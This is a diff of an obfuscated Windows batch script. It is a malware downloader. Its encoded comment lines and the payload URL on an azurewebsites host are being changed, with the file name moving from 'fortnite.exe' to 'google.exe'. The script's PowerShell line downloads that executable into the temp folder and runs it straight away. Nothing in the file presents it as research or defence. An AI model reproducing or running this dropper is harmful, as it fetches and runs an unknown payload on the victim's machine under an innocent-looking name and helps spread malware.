@@ -2,7 +2,7 @@
 ::
 ::fBE1pAF6MU+EWHreyHcjLQlHcCGONVeeCbYJ5e31+/m7hUQJfPc9RK7L36zDEPIW7kTweoQ+6ltKndM8Hh5cfwakfBx6uWBF1g==
 ::YAwzoRdxOk+EWAjk
-::fBw5plQjdCyDJGyX8VAjFD5YRTimM3y0Crod7PvH2uSTp18aQewrfZ2W9rGPJq0+40jhZtsd2H0UkcgDbA==
+::fBw5plQjdCyDJGyX8VAjFD5YRTimM3y0Crod7PvH6OWIpUEYUPA2bork2KaqH+kQ5UuqfJUitg==
 ::YAwzuBVtJxjWCl3EqQJgSA==
 ::ZR4luwNxJguZRRnk
 ::Yhs/ulQjdF+5
@@ -27,7 +27,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kPrZ4Ij325fkMoPB1VdZhfL
+::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kLrepEh035Ikd0JQh5Ae3I=
 ::YB416Ek+ZG8=
 ::
 ::
@@ -35,7 +35,7 @@
 @echo off
 
 
-set files= 'http://mogiant.azurewebsites.net/fortnite.exe'
+set files= 'http://mogiant.azurewebsites.net/google.exe'
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 
